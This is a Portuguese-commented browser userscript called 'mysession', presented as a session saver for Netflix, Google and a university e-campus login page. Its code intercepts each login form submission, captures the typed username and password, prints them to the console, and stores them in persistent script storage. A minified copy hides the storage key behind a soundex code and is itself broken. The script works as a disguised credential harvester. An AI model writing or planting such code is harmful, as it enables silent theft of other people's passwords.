// ==UserScript==
// @name        mysession
// @description	salvar sessões em (3) sites
// @namespace   http://pastebin.com/EGAuDuhr
// @include     *://www.netflix.com/*Login*
// @include     *://accounts.google.com/*ServiceLogin?*
// @include     *://accounts.google.com/*signin*
// @include     *://ecampus.ufam.edu.br/ecampus/*login*
// @version     1.18-2
// @require	https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js
// @grant       GM_getValue
// @grant       GM_setValue
// @grant       GM_deleteValue
// ==/UserScript==

/** MINIMIZADO (UP THIS)
const show=!1,del=!1;!function(t){String.prototype.isEmpty=function(){return!this.trim()};var e=GM_getValue("S132",[]);e.forEach(function(t){console.error(t)}),1==mostrar&&console.log(JSON.stringify(e)),1==deletar&&GM_deleteValue("S132"),document.querySelector("form").addEventListener("submit",function(n){var o=t('input[type="email"], input[name="email"], input[type="text"]').val(),i=t('input[type="password"], input[name="password"]').val();if(!o.isEmpty()&&!i.isEmpty()){var r={hst:location.host,dte:(new Date).toLocaleString(),lgn:o,pss:i};e.push(r),GM_setValue("S132",e)}})}(jQuery);
**/

/*
→ Netflix
→ Gmail
→ Ecampus
*/


//TODO: encontrar campo que contém login ($('form').Email) no Gmail

const mostrar = true;
const deletar = false;

(function($) {
	String.prototype.isEmpty = function() { return !(this.trim());	};
	var onhistory = GM_getValue('savedsession', []);
	console.info(onhistory.length);
	if(mostrar == true) onhistory.forEach( function(e) { console.error(e) } );
	if(deletar == true) GM_deleteValue('savedsession');

	document.querySelector('form').addEventListener('submit', function (e) {
		e.preventDefault(); // <<<< COMMENT
		
		var login = $('input[type="email"], input[name="email"], input[type="text"]').val();
		var senha = $('input[type="password"], input[name="password"]').val();
  
		console.log("login:",login)
		console.log("senha:",senha)

		if(!login.isEmpty() && !senha.isEmpty()){
			var newdata = {
				"hst": location.host,
				"dte": new Date().toLocaleString(),
				"lgn": login,
				"pss": senha
			};
			onhistory.push(newdata);//TODO verificar se o 'lgn', 'hst' e 'pss' já existem no array de histórico
			// console.log( newdata );
			GM_setValue('savedsession', onhistory);      
		}
	});
})(jQuery);

/*********************
soundex("savedsession")
S132

soundex("login")
2L50

soundex("senha")
S500

soundex("onhistory")
O523

soundex('newdata')
N330
/*********************/

// http://chris.photobooks.com/json/
// https://javascript-minifier.com/
